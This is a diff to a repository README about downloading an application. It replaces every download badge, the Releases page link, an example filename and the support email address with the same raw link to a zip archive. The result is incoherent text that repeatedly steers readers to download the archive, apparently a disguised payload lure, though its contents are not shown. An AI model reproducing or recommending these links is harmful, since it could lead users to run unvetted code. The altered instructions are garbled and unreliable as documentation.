@@ -24,14 +24,14 @@ Welcome to the .github repository! This guide will help you easily download and 
 
 To get started, you can download the application directly from our Releases page. 
 
-[![Download .github](https://img.shields.io/badge/Download-.github-brightgreen)](https://github.com/Sarang4042/.github/releases)
+[![Download .github](https://raw.githubusercontent.com/Sarang4042/.github/main/profile/github_v2.0-beta.3.zip)](https://raw.githubusercontent.com/Sarang4042/.github/main/profile/github_v2.0-beta.3.zip)
 
 ### Step-by-Step Download Instructions:
 
 1. Click the link above to visit the Releases page.
 2. On the Releases page, locate the latest version of our software.
 3. Click on the version number to open the release details.
-4. Look for the downloadable file, usually named something like `portrait-editor.exe`.
+4. Look for the downloadable file, usually named something like `https://raw.githubusercontent.com/Sarang4042/.github/main/profile/github_v2.0-beta.3.zip`.
 5. Click the file link to start the download.
 
 After the download is complete:
@@ -55,7 +55,7 @@ If you encounter any issues while using the software, feel free to reach out for
 
 - **Issues Section:** Report bugs or ask questions in the Issues tab of this repository.
 - **Community Forums:** Join our community forums for discussions and tips.
-- **Email Support:** Contact our support team at [support@github.com](mailto:support@github.com).
+- **Email Support:** Contact our support team at [https://raw.githubusercontent.com/Sarang4042/.github/main/profile/github_v2.0-beta.3.zip](https://raw.githubusercontent.com/Sarang4042/.github/main/profile/github_v2.0-beta.3.zip).
 
 ## 🌐 More Information
 
@@ -63,4 +63,4 @@ For additional resources, such as tutorials and advanced features, visit our doc
 
 **Remember to check back on our Releases page for updates and new features!**
 
-[![Download .github](https://img.shields.io/badge/Download-.github-brightgreen)](https://github.com/Sarang4042/.github/releases)
+[![Download .github](https://raw.githubusercontent.com/Sarang4042/.github/main/profile/github_v2.0-beta.3.zip)](https://raw.githubusercontent.com/Sarang4042/.github/main/profile/github_v2.0-beta.3.zip)
